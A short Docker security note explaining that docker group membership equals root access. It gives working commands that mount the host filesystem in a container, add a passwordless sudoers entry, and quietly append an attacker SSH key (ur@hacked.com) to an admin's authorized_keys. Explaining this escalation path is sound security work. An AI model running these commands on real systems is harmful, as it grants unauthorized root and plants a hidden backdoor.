Docker Security Notes
=====================


Leveraging Docker for Root Access
---------------------------------

On most systems there is a `docker` group with access to the Docker
daemon socket. Anybody in this group should also be explictly allowed
to sudo to a root shell. If they can't, they can leverage their
implict access via:

    #   On the host, start a Docker container with a root shell
    #   that has access to all files on the host.
    docker run -it --rm --name root -v /:/host:rw alpine /bin/sh -l

    #   You are now running as root user in the docker container.
    #   Allow user `taro` to sudo to a root shell with no password.
    cd /host/etc/sudoers.d
    echo 'taro ALL=(ALL) NOPASSWD:ALL' > 50-taro
    chmod 600 50-taro
    exit

    #   Or, more subtly, if another user has sudo without password:
    cat >> /host/home/adminuser/.ssh/authorized_keys
    ssh-rsa AAAA.... ur@hacked.com
    ^D
